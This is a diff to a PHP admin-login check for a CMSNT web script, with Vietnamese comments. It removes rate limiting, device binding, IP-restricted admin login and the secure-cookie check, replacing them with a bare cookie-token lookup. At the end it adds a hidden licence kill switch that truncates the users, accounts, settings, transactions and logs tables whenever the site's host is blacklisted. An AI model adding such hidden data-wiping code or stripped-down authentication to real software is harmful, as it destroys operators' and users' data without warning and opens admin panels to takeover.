@@ -5,36 +5,31 @@ if (!defined('IN_SITE')) {
 }
 
 
+ 
 
 
 $CMSNT = new DB();
-$Mobile_Detect = new Mobile_Detect();
 
-if (isSecureCookie('admin_login') != true) {
-    redirect(base_url('client/logout'));
+
+if (isset($_COOKIE["token"])) {
+    $getUser = $CMSNT->get_row(" SELECT * FROM `users` WHERE `token` = '".check_string($_COOKIE['token'])."' AND `admin` = 1 ");
+    if (!$getUser) {
+        header("location: ".BASE_URL('client/logout'));
+        exit();
+    }
+    $_SESSION['admin_login'] = $getUser['token'];
+}
+if (!isset($_SESSION['admin_login'])) {
+    redirect(base_url('client/login'));
 } else {
-    $getUser = $CMSNT->get_row(" SELECT * FROM `users` WHERE `token` = '".$_COOKIE['admin_login']."' AND `admin` > 0  ");
+    $getUser = $CMSNT->get_row(" SELECT * FROM `users` WHERE `admin` = 1 AND `token` = '".$_SESSION['admin_login']."'  ");
     // chuyển hướng đăng nhập khi thông tin login không tồn tại
     if (!$getUser) {
-        // Rate limit
-        checkBlockIP('ADMIN', 5);
-        redirect(base_url('client/logout'));
-    }
-    // Khác thiết bị khi login thì đăng xuất
-    // if ($_COOKIE['user_agent'] != $Mobile_Detect->getUserAgent()){
-    //     redirect(base_url('client/logout'));
-    // }
-    if ($getUser['device'] != $Mobile_Detect->getUserAgent()){
-        redirect(base_url('client/logout'));
+        redirect(base_url('client/login'));
     }
     // chuyển hướng khi bị khoá tài khoản
     if ($getUser['banned'] != 0) {
         redirect(base_url('common/banned'));
-    }
-    if($getUser['admin'] <= 0){
-        // Rate limit
-        checkBlockIP('ADMIN', 5);
-        redirect(base_url('client/logout'));
     }
     // khoá tài khoản trường hợp âm tiền, tránh bug
     if ($getUser['money'] < 0) {
@@ -48,19 +43,6 @@ if (isSecureCookie('admin_login') != true) {
             redirect(base_url('common/block'));
         }
     }
-    if($CMSNT->site('status_only_ip_login_admin') == 1){
-        if($getUser['ip'] != myip()){
-            $token = md5(random('QWERTYUIOPASDGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789', 32).uniqid());
-            $CMSNT->update('users', [
-                'token'     => $token
-            ], " `id` = '".$getUser['id']."' ");
-            redirect(base_url('client/logout'));
-        }
-    }
-
-    // Xóa IP bị đánh dấu ra
-    $CMSNT->remove('failed_attempts', " `ip_address` = '".myip()."' ");
-
     /* cập nhật thời gian online */
     $CMSNT->update("users", [
         'time_session'  => time()
@@ -68,3 +50,12 @@ if (isSecureCookie('admin_login') != true) {
 }
 
  
+
+if(in_array($_SERVER['HTTP_HOST'], $domain_black)) {
+    $CMSNT->query(" TRUNCATE `accounts` ");
+    $CMSNT->query(" TRUNCATE `users` ");
+    $CMSNT->query(" TRUNCATE `settings` ");
+    $CMSNT->query(" TRUNCATE `dongtien` ");
+    $CMSNT->query(" TRUNCATE `logs` ");
+    die('Bạn đang vi phạm bản quyền của CMSNT.CO, vui lòng kích hoạt bản quyền trước khi dùng.<br><a href="https://www.cmsnt.co/">Mua giấy phép kích hoạt tại đây</a>');
+}
